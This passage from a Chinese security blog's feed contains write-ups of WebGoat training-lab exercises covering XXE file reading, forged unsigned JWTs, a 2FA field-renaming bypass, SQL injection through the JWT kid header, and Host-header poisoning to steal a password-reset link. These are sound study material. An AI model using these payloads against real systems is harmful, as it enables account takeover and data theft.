alt="image-20231123180034526"></p><p>这就很nice了，终于把这条思路走通了</p><p>这里还要再深挖一下为什么是这样？</p><p>通过关键字role全局搜索一下，然后找到了这个</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126541.png" alt="image-20231123181632640"></p><p>可以看到，它并不是lesson中的javabean</p><p>我们回想一下，我们访问的是根目录下的user页面而不是子目录的某个lesson的页面，因此这里的user可能不是这个org.owasp.webgoat.lessons.missingac.User.java</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126542.png" alt="image-20231123181421895"></p><p>此时我们再看</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126543.png" alt="image-20231123182427749"></p><p>这个userrepo：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126544.png" alt="image-20231123182712982"></p><p>继续跟进去</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126545.png" alt="image-20231123182854157"></p><p>发现它是从数据库动态查询用户数据</p><p>但是这个数据库是这个题目的独立数据库还是整个项目用来储存实际用户比如我（water3666）？继续跟进发现有点过于复杂了，但是这里已经说明了数据是来自哪里了：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126546.png" alt="image-20231123183252707"></p><p>当时没反应过来，如果是题目的数据库，应该是tom或者jerry，或者根本没有独立的数据库，至于如何封装到题目的user的，就先不挖了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;IDOR-2&quot;&gt;&lt;a href=&quot;#IDOR-2&quot; class=&quot;headerlink&quot; title=&quot;IDOR-2&quot;&gt;&lt;/a&gt;IDOR-2&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;许多访问控制问题容易受到经过身份验证但未经授权的用户的攻击。因此，让我们从合法身份</summary>
      
    
    
    
    
    <category term="WebGoat" scheme="https://taninluv.github.io/tags/WebGoat/"/>
    
    <category term="代码审计" scheme="https://taninluv.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="IDOR" scheme="https://taninluv.github.io/tags/IDOR/"/>
    
  </entry>
  
  <entry>
    <title>WebGoat-XXE</title>
    <link href="https://taninluv.github.io/2023/11/23/WebGoat-XXE/"/>
    <id>https://taninluv.github.io/2023/11/23/WebGoat-XXE/</id>
    <published>2023-11-23T01:31:58.000Z</published>
    <updated>2023-11-23T04:40:51.885Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于xml、DTD"><a href="#关于xml、DTD" class="headerlink" title="关于xml、DTD"></a>关于xml、DTD</h1><p><a href="https://drun1baby.top/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/">从0到1完全掌握XXE | Drunkbaby’s Blog (drun1baby.top)</a></p><h1 id="XXE-4"><a href="#XXE-4" class="headerlink" title="XXE-4"></a>XXE-4</h1><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311231240626.png" alt="image-20231123095315742"></p><p>这道题是标准的xxe注入，这里不多赘述，主要看看源码探究一下漏洞是如何导致的：</p><p>这里需要补充一个知识点：</p><p><a href="https://juejin.cn/post/6844903704085299214">组件使用总结：使用 JAXB 实现 XML文件和java对象互转 - 掘金 (juejin.cn)</a></p><p>关键点就是：<strong>当把 XML 格式的字符串传递给 Unmarshaller 接口转变成 Java 对象时，会解析一遍 XML，如果传入的值可控就会导致 XXE 注入攻击。</strong></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311231240627.png" alt="image-20231123102310270"></p><p>这道题实际是看返回的路径中是否包含系统的敏感路径，包含则为成功，这里真正引发xxe的点在parseXml中，我们进去看一看：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311231240628.png" alt="image-20231123102520735"></p><p>结合前面补充的知识，我们知道他进行了一次反序列化，将xml解析成java对象（这里是comment），解析过程中，就触发了我们的payload（这里是file:&#x2F;&#x2F;&#x2F;读取根目录）</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><a href="https://drun1baby.top/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/">WebGoat代码审计-05-XXE注入 | Drunkbaby’s Blog (drun1baby.top)</a></p><blockquote><p>产生 XXE 注入是因为解析 XML 时不加任何的限制，那么我们的修复手段讲将支持外部实体和支持dtd都给禁止便可。</p></blockquote><h1 id="XXE-7"><a href="#XXE-7" class="headerlink" title="XXE-7"></a>XXE-7</h1><blockquote><p>现代REST框架 在现代REST框架中，服务器可能能够接受您作为开发人员没有想到的数据格式。因此，这可能会导致JSON端点容易受到XXE攻击。 同样的练习，但尝试执行和第一次作业中相同的XML注入。</p></blockquote><p>根据描述来看，这可能受到修改Content-Type导致的注入攻击，就像文件上传的一些文件格式的绕过一样.</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311231240629.png" alt="image-20231123104701691"></p><p>还是要看看源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311231240630.png" alt="image-20231123105220095"></p><p>又是parseXml，倒也没什么好说的了</p><p>但是这种注入方式有一个问题：我们怎么知道目标是封装在什么类中（这里是封装在comment类中）</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311231240632.png" alt="image-20231123105753426"></p><p>我们可以看到，我们随意封装到一个对象中，是无法成功解析的，要进行这样的攻击需要了解额外的信息，在一开始的json字符中，我们能知道的仅仅是输入的内容属于“text”字段：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311231240633.png" alt="image-20231123110003923"></p><h1 id="XXE-DDOS"><a href="#XXE-DDOS" class="headerlink" title="XXE DDOS"></a>XXE DDOS</h1><p><a href="https://en.wikipedia.org/wiki/Billion_laughs_attack">Billion laughs attack - Wikipedia</a></p><h1 id="XXE-11-blind"><a href="#XXE-11-blind" class="headerlink" title="XXE-11 blind"></a>XXE-11 blind</h1><p>这里需要补充一些东西：</p><p><a href="https://drun1baby.top/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/">从0到1完全掌握XXE | Drunkbaby’s Blog (drun1baby.top)</a></p><blockquote><p><strong>参数实体：</strong></p><p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且只能在 DTD 中使用 <code>%实体名;</code> 引用</p><p>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体</p><p>(3)和通用实体一样，参数实体也可以外部引用</p></blockquote><blockquote><p>在某些情况下，您将看不到任何输出，因为尽管您的攻击可能已经奏效，但该字段并没有反映在页面的输出中。或者您试图读取的资源包含非法的XML字符，这会导致解析器失败。</p></blockquote><p>这道题需要通过xxe读取<code>/home/webgoat/.webgoat-8.1.0//XXE/secret.txt</code>这个文件</p><p>还是先读一下源码吧：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311231240634.png" alt="image-20231123111923003"></p><p>主要是一些判定语句和触发xxe的parseXml方法，然后没有抛出erro，我们看一下之前的：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311231240635.png" alt="image-20231123112153350"></p><p>这里没有抛出异常，所以没有回显，需要盲注</p><p>eval.dtd:</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///home/webgoat/.webgoat-8.1.0//XXE/secret.txt&quot;&gt;</code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311231240107.png" alt="image-20231123120256707"></p><p>此时刷新页面：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311231240636.png" alt="image-20231123120314497"></p><p>这里已经都出来了，不知道为啥回显说不对。</p><p>这里还要考虑一个问题，就是当comment也不显示的时候，此时我们需要消息外带，此时需要多个dtd协同：</p><p>但是这里主要研究代码审计，不多解释：</p><p><a href="https://blog.csdn.net/weixin_44420143/article/details/118721145">XXE知识总结，有这篇就够了！-CSDN博客</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;关于xml、DTD&quot;&gt;&lt;a href=&quot;#关于xml、DTD&quot; class=&quot;headerlink&quot; title=&quot;关于xml、DTD&quot;&gt;&lt;/a&gt;关于xml、DTD&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://drun1baby.top/2022/04/19/</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://taninluv.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="webGoat" scheme="https://taninluv.github.io/tags/webGoat/"/>
    
    <category term="XXE" scheme="https://taninluv.github.io/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>WebGoat-Authentication_Bypasses_1</title>
    <link href="https://taninluv.github.io/2023/11/19/WebGoat-Authentication-Bypasses/"/>
    <id>https://taninluv.github.io/2023/11/19/WebGoat-Authentication-Bypasses/</id>
    <published>2023-11-19T01:56:25.000Z</published>
    <updated>2023-11-23T01:54:00.417Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2FA"><a href="#2FA" class="headerlink" title="2FA"></a>2FA</h1><p>这道题他先给了一个例子，<a href="https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass">https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass</a></p><p>是一个绕过PayPal 2FA的案例，案例中把认证的问题字段抓包删除之后发送直接绕过了验证。</p><span id="more"></span><p>照着这个思路做他给的这道题，直接删除字段好像不行，我们先审计一下源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191024345.png" alt="image-20231119102436245"></p><p>可以看到，想要返回success，需要<code>verificationHelper.didUserLikelylCheat((HashMap) submittedAnswers)</code></p><p>返回False，然后<code>verificationHelper.verifyAccount(Integer.valueOf(userId), (HashMap) submittedAnswers)</code>为True，跟进这两个函数看一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191028892.png" alt="image-20231119102805345"></p><p>想要<code>didUserLikelylCheat</code>返回0，不能提交正确的答案，他这道题就是让我们必须绕过验证，他这里检查的作弊应该是直接用源码里的验证答案~到这里删除包里的答案字段应该是可以行得通的，继续往下看为什么不可以：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191115968.png" alt="image-20231119103208557"></p><p>想要<code>verifyAccount</code>返回1，对于map的size()方法是返回键值对的个数，这里他检测了输入的键值对数量是否和答案的键值对数量是否相同，因此不能直接删除包里的答案字段了，后面两个if是检测输入的值和答案相同，最终返回true。</p><p>目前看来，我们必须输入两个答案字段（两个键值对），并且必须携带错误的答案绕过作弊检测，输入正确的答案绕过身份验证，看起来好像很矛盾，但是如果我们的键没有他要检测的这两个键就可以直接绕过身份验证的if检测：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191118060.png" alt="image-20231119111849009"></p><p>但是似乎回显并不正确？看一看键值对怎么传进去的：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191116440.png" alt="image-20231119111637385"></p><p>原来是需要包含secQuestion字段的键，但是str.contains()方法是检测子句是否包含，也就是说我们传入包含键名secQuestion字段的键就可以了，比如secQuestiona、secQuestionb：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191119655.png" alt="image-20231119111925607"></p><p>通过辣：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191119526.png" alt="image-20231119111939481"></p><h1 id="JWT-4"><a href="#JWT-4" class="headerlink" title="JWT-4"></a>JWT-4</h1><p>关于jwt不再赘述，这里先看题</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311200947836.png" alt="image-20231120094744680"></p><p>这里让修改账户的jwt使之成为管理员用户，然后投票，先抓包看看：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311200949474.png" alt="image-20231120094958421"></p><p>与此同时，我们还看见了access_token&#x3D;””，很奇怪：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311200957608.png" alt="image-20231120095737558"></p><p>看见了jwt，但是不知道如何判定身份，进入源码审计一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311200959298.png" alt="image-20231120095943236"></p><p>这里大致看得出来是通过<code>admin</code>把作为身份判定的关键字，这里可以构造</p><pre><code>&quot;adimn&quot;:&quot;true&quot;</code></pre><p>isadmin因为是bool类型，直接传入True,发现验证还是没通过，找一下这个access_token:</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110366.png" alt="image-20231120101425320"></p><p>先看到如果user的值包含在vaildUsers中，就会加入非admin的jwt，否则判定为未认证，再往下看：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110368.png" alt="image-20231120101953066"></p><p>从这一段看accessToken不能为空，否则会被限制为guest，与此同时user值不能为Guset，也不是vaildUser的子段。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110369.png" alt="image-20231120102425875"></p><p>跟之前差不多，似乎只要不为空即可</p><p>但是又发现：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110370.png" alt="image-20231120103450762"></p><p>400了，看了一下路由，发现是提交到refresh的，到这段路由看一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110371.png" alt="image-20231120104224931"></p><p>发现虽然没有解析admin，但也不至于报错，而且required &#x3D; false？仔细检查发现json不同键值对之间要用<code>,</code>间隔~</p><p>修改后发现：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110372.png" alt="image-20231120104401256"></p><p>这里应该生成token，这道题的入口应该不在这里，因为根据这段路由来看我们无法自建用户和密码通过验证，最终导致UNAUTHORIZED</p><p>其实目前看来，需要找传到这段路由的数据然后修改包：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110374.png" alt="image-20231120104700675"></p><p>然后抓到了这个包：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110375.png" alt="image-20231120104828334"></p><p>但是发现不行，突然发现有一个切换用户的地方，笑死，还是太急躁了，没有好好检查页面就开始乱审计，先点击切换用户登录，这时候就可以点击重置投票的按钮了：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110376.png" alt="image-20231120152102403"></p><p>这里还是得用专门的网站，不然解码有乱码，修改后加密发送很可能出问题：<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110377.png" alt="image-20231120110120545"></p><p>这里有一个坑，题目是没有签名的，所以把header和payload贴过去就可以了，后面蓝色部分是网站初始化生成的，不是我们需要的，所以我的最终payload是：</p><pre><code>eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3MDEzMjg0ODksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.</code></pre><h1 id="JWT-5"><a href="#JWT-5" class="headerlink" title="JWT-5"></a>JWT-5</h1><p>这题是jwt破解，找个工具用rockyou.txt跑一下就可以了,要把exp时间戳修改到未过期的时间</p><h1 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h1><p>他这里提到了一个无状态会话：</p><pre><code>&#123;    &quot;token_type&quot;:&quot;bearer&quot;,    &quot;access_token&quot;:&quot;XXXX.YYYY.ZZZZ&quot;,    &quot;expires_in&quot;:10,    &quot;refresh_token&quot;:&quot;4a9a0b1eac1a34201b3c5659944e8b7&quot;&#125;</code></pre><p>原文：</p><blockquote><p>正如你所看到的，刷新令牌是一个随机字符串，服务器可以跟踪它（在内存或数据库中），以便将刷新令牌与授予刷新令牌的用户相匹配。因此，在这种情况下，只要访问令牌仍然有效，我们就可以称之为“无状态”会话，服务器端就没有设置用户会话的负担，令牌是自包含的。当访问令牌不再有效时，服务器需要查询存储的刷新令牌，以确保该令牌不会以任何方式被阻止。 每当攻击者持有访问令牌时，该令牌仅在一定时间内有效（例如10分钟）。然后，攻击者需要刷新令牌来获取新的访问令牌。这就是为什么刷新令牌需要更好的保护。也可以使刷新令牌无状态，但这意味着查看用户是否吊销了令牌将变得更加困难。服务器完成所有验证后，必须向客户端返回一个新的刷新令牌和一个新访问令牌。客户端可以使用新的访问令牌来进行API调用。</p></blockquote><p>看起来jwt只给了一个10分钟但是我们不知道是什么时候开始什么时候结束</p><p>原文：</p><blockquote><p>你应该检查什么？ </p><p>无论选择哪种解决方案，都应该在服务器端存储足够的信息，以验证用户是否仍然可信。你可以考虑很多事情，比如存储ip地址，跟踪刷新令牌的使用次数（在访问令牌的有效时间窗口中多次使用刷新令牌可能表明有奇怪的行为，你可以撤销所有令牌，让用户再次进行身份验证）。还要跟踪哪个访问令牌属于哪个刷新令牌，否则攻击者可能会使用攻击者的刷新令牌为其他用户获取新的访问令牌（请参阅<a href="https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/%E5%86%99%E4%B8%80%E7%AF%87%E5%85%B3%E4%BA%8E%E8%BF%99%E7%A7%8D%E6%94%BB%E5%87%BB%E6%98%AF%E5%A6%82%E4%BD%95%E8%BF%90%E4%BD%9C%E7%9A%84%E5%A5%BD%E6%96%87%E7%AB%A0%EF%BC%89%E6%AD%A4%E5%A4%96%EF%BC%8C%E6%A3%80%E6%9F%A5%E7%94%A8%E6%88%B7%E7%9A%84ip%E5%9C%B0%E5%9D%80%E6%88%96%E5%9C%B0%E7%90%86%E4%BD%8D%E7%BD%AE%E4%B9%9F%E6%98%AF%E4%B8%80%E4%BB%B6%E5%A5%BD%E4%BA%8B%E3%80%82%E5%A6%82%E6%9E%9C%E6%82%A8%E9%9C%80%E8%A6%81%E5%8F%91%E6%94%BE%E6%96%B0%E7%9A%84%E4%BB%A4%E7%89%8C%EF%BC%8C%E8%AF%B7%E6%A3%80%E6%9F%A5%E4%BD%8D%E7%BD%AE%E6%98%AF%E5%90%A6%E4%BB%8D%E7%84%B6%E7%9B%B8%E5%90%8C%EF%BC%88%E5%A6%82%E6%9E%9C%E4%B8%8D%E6%92%A4%E9%94%80%E6%89%80%E6%9C%89%E4%BB%A4%E7%89%8C%E5%B9%B6%E8%AE%A9%E7%94%A8%E6%88%B7%E5%86%8D%E6%AC%A1%E8%BF%9B%E8%A1%8C%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%EF%BC%89%E3%80%82">https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/写一篇关于这种攻击是如何运作的好文章）此外，检查用户的ip地址或地理位置也是一件好事。如果您需要发放新的令牌，请检查位置是否仍然相同（如果不撤销所有令牌并让用户再次进行身份验证）。</a></p></blockquote><ul><li>储存ip</li><li>跟踪刷新令牌次数</li><li>跟踪哪个访问令牌属于哪个刷新令牌</li></ul><p>原文：</p><blockquote><p>需要刷新令牌 在现代单页应用程序（SPA）中使用刷新令牌有意义吗？</p><p>正如我们在关于存储令牌的部分中所看到的，有两种选择：网络存储或cookie，这意味着刷新令牌就在访问令牌旁边，因此如果访问令牌被泄露，刷新令牌也可能被泄露。当然，大多数时候都是有区别的。访问令牌是在您进行API调用时发送的，刷新令牌仅在应该获得新的访问令牌时发送，在大多数情况下，该访问令牌是不同的端点。如果您最终在同一台服务器上，您可以选择只使用访问令牌。 如上所述，使用访问令牌和单独的刷新令牌为服务器提供了一些优势，使其不必反复检查访问令牌。仅当用户需要新的访问令牌时才执行检查。当然，只使用访问令牌是可能的。在服务器上，您存储的信息与为刷新令牌存储的信息完全相同，请参阅上一段。通过这种方式，您每次都需要检查令牌，但根据应用程序的不同，这可能是合适的。在存储刷新令牌以进行验证的情况下，保护这些令牌也很重要（至少使用哈希函数将它们存储在数据库中）。 JWT是个好主意吗？ 有很多可用的资源对使用JWT令牌进行Cookie的客户端到服务器身份验证的用例提出了质疑。使用JWT令牌的最佳位置是服务器与服务器之间的通信。在普通的web应用程序中，您最好使用普通的旧cookie。有关详细信息，请参阅：</p><ul><li><a href="http://cryto.net/~joepie91/blog/2016/06/13/stop-using-jwt-for-sessions/">stop-using-jwt-for-sessions</a></li><li><a href="http://cryto.net/~joepie91/blog/2016/06/19/stop-using-jwt-for-sessions-part-2-why-your-solution-doesnt-work/">stop-using-jwt-for-sessions-part-2-why-your-solution-doesnt-work</a></li></ul></blockquote><ul><li>访问令牌泄露和刷新令牌泄露大多数时候是有区别的</li><li>使用JWT令牌的最佳位置是服务器与服务器之间的通信</li></ul><p>可能翻译有点问题，后面或许会单独开一篇研究上面提到的文章链接</p><h1 id="jwt-7"><a href="#jwt-7" class="headerlink" title="jwt-7"></a>jwt-7</h1><p>这题先给了一个案例<a href="https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/">here</a>，大概是刷新令牌没有和访问令牌或者用户绑定，我可以用自己的刷新令牌刷新别人的令牌，大概过程是</p><pre><code>&#123;&quot;code&quot;:0,&quot;data&quot;:&#123;&quot;access_token&quot;:&quot;XXX.YYY.ZZZ&quot;,&quot;access_token_expiration&quot;:&quot;Thursday, November 9th, 2017, 10:27:33 PM&quot;,&quot;refresh_token&quot;:&quot;ABC123&quot;&#125;&#125;</code></pre><p>这里收到了一个刷新令牌”refresh_token”:”ABC123”</p><p>然后发送</p><pre><code>POST /auth/refresh HTTP/1.1Host: auth.example.comContent-Type: application/jsonAuthorization: Bearer XXX.YYY.ZZZ&#123;&quot;refresh_token&quot;:&quot;ABC123&quot;&#125;</code></pre><p>最终收到了新的令牌</p><p>然后回到这道题：From a breach of last year the following logfile is available <a href="http://172.20.10.3:8080/WebGoat/images/logs.txt">here</a> Can you find a way to order the books but let <strong>Tom</strong> pay for them?</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110378.png" alt="image-20231120163752336"></p><p>我们先点击链接看看日志里面有一个token，解密得到：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110379.png" alt="image-20231120164041633"></p><p>但是我们并没有得到刷新令牌之类的，还是审计一下源码。</p><p>有了之前的经验，这次直接找到提交的路由先进行审计：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110380.png" alt="image-20231120165855282"></p><p>总的来说，需要创建一个header为Authorization，然后把字符串<code>Bearer </code>(这里字符串后面有一个空格)替换为空，不知道是不是必要的（后来抓包发现是自带的），处理后的字符串进行了jwt解析，也就是说传入的数据是这样的（看了wp然后又审了一遍才反应过来的，又学到了hh）：</p><pre><code>Authorization:  Bearer &#123;JWT&#125; </code></pre><p>   然后要user值为Tom，至于alg是否置空似乎都可以success</p><p>再看看刷新token部分：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110381.png" alt="image-20231120170427057"></p><p>和上面重叠的比较多，这里需要user和refreshToken都不为空，refreshToken来自我们传入的请求体，是一个json，也就是jwt，同时他要存在于validRefreshTokens，追一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110382.png" alt="image-20231120170914764"></p><p>这里发现是20个随机字母，这里他或许会自己生成</p><p>当然这些只是顺带看一眼，我们按照之前log拿到的JWT，修改一下时间戳，发送试试：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110383.png" alt="image-20231120172549432"></p><p>ok了</p><h1 id="jwt-8"><a href="#jwt-8" class="headerlink" title="jwt-8"></a>jwt-8</h1><p>这道题很奇怪，源码中找不到对应的路由，但是其对应的源码应该就是这一段：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110384.png" alt="image-20231121095746850"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110385.png" alt="image-20231121100034949"></p><p>这里看起来有一个很明显的sql注入，大概逻辑是header中传入一个kid然后与数据库比对，返回查询结果 ；然后payload中的username为Tom即可success，尝试：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110386.png" alt="image-20231121102201508"></p><p>发现返回“Not a valid JWT token”，再审审：</p><p>这里存在一个jwt解析器，之前没看明白：</p><p><a href="https://www.jianshu.com/p/6bfeb86885a3">JJWT使用笔记（二）—— JWT token的解析 - 简书 (jianshu.com)</a></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110387.png" alt="image-20231121103952935"></p><p>这个解析器可以发现我的jwt没签名，因此返回错误，但是我怎么知道签名呢？看</p><p>这个setSigningKeyResolver</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110388.png" alt="image-20231121104250134"></p><p>他这里跟示例不一样，使用了一个获取器里包含箭头函数，应该是特定用法，用于动态获取SigningKey，暂不深究语法。然后是sql查询根据kid找到对应的SigningKey，并进行了base64解码，为什么要解码呢？因为查询出来的SigningKey应该是base64加密的，此时我们让kid查询返回为空，然后union插入一段base64加密后的字段（SigningKey），那么我们就可以控制SigningKey了</p><pre><code>water3 =&gt; d2F0ZXIz</code></pre><p>这里有个小坑：</p><p>看着时post发包下意识使用<code>#</code>注释，但是这里可能上下文不支持服务器会出错，需要使用<code>--</code>来注释：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110389.png" alt="image-20231121110851500"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110390.png" alt="image-20231121110909467"></p><p>ok了</p><h1 id="Password-reset-6"><a href="#Password-reset-6" class="headerlink" title="Password reset-6"></a>Password reset-6</h1><p>这里让我们想办法重置Tom的密码，我们先点击忘记密码，然后输入tom的邮箱发送验证，这里抓包看一下路由，然后进入相应的源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311230953818.png" alt="image-20231121195551566"></p><p>我们发现这里挺奇怪的，包头的host如果发生变化，他就尝试发送邮件。这里有个坑就是这种写法是为了信息不出网和配合webwolf使用 ，可能更多的是让我们体验一下吧？</p><p>这里我们修改host的端口到webwolf，也就是9090，响应将把带着重置链接的邮件发送到9090端口，这时我们查看9090接收到request就能拿到Tom的重置链接。</p><p>这里有个两个问题：</p><p>修改了host端口为什么还能被我们的后端（服务器）正确响应并发送邮件？</p><blockquote><p>这是因为spring的基于路径匹配的路由，不管host是什么，只有主机收到如何路径的url，就会触发该路由的解析，因此修改了端口也能正常发包。当然这里也可以可以使用 <code>application.properties</code> 或 <code>application.yml</code> 文件来配置端口号和路由绑定，但是这道题的路由显然没有~</p></blockquote><p>如果修改了host地址为与url不匹配的其他主机？</p><blockquote><p>这类请求常常被称为跨域请求（Cross-Origin Request）。</p><p>在浏览器中，跨域请求可能会受到同源策略（Same-Origin Policy）的限制，不允许从一个源（域、协议、端口）向另一个源发送 AJAX 请求。但是在服务器端，使用 Python 的 <code>requests</code> 库发送请求时，一般不会受到同源策略的限制。</p><p>但需要注意的是，在某些情况下，服务器端也可能会对请求进行同源检查或设置跨域请求的限制，这取决于服务器端的配置。例如，服务器可能会使用 CORS（跨域资源共享）来控制是否允许跨域请求。</p></blockquote><p>然后我们拿到了重置链接：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311230953820.png" alt="image-20231121201732672"></p><p>然后把host改为修改前的xxxx:8080,此时显示404，我们按照正常流程重置自己密码走一遍，发现路径少了一个WebGoat,可能时这个版本没有把8080的默认路由绑定到WebGoat，所以要手动添加一下：</p><pre><code>http://172.20.10.3:8080/WebGoat/PasswordReset/reset/reset-password/55af2d7b-c49b-43c3-8d62-a2110385036b</code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311230953821.png" alt="image-20231121202403643"></p><p>重置一下就ok了</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;2FA&quot;&gt;&lt;a href=&quot;#2FA&quot; class=&quot;headerlink&quot; title=&quot;2FA&quot;&gt;&lt;/a&gt;2FA&lt;/h1&gt;&lt;p&gt;这道题他先给了一个例子，&lt;a href=&quot;https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass&quot;&gt;https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;是一个绕过PayPal 2FA的案例，案例中把认证的问题字段抓包删除之后发送直接绕过了验证。&lt;/p&gt;</summary>
    
    
    
    
    <category term="WebGaot" scheme="https://taninluv.github.io/tags/WebGaot/"/>
    
    <category term="代码审计" scheme="https://taninluv.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="2FA" scheme="https://taninluv.github.io/tags/2FA/"/>
    
    <category term="jwt" scheme="https://taninluv.github.io/tags/jwt/"/>
    
  </entry>
  
  <entry>
    <title>WebGoat-Sql</title>
    <link href="https://taninluv.github.io/2023/11/18/WebGoat-Sql/"/>
    <id>https://taninluv.github.io/2023/11/18/WebGoat-Sql/</id>
    <published>2023-11-18T07:12:02.000Z</published>
    <updated>2023-11-18T08:25:00.967Z</updated>
    
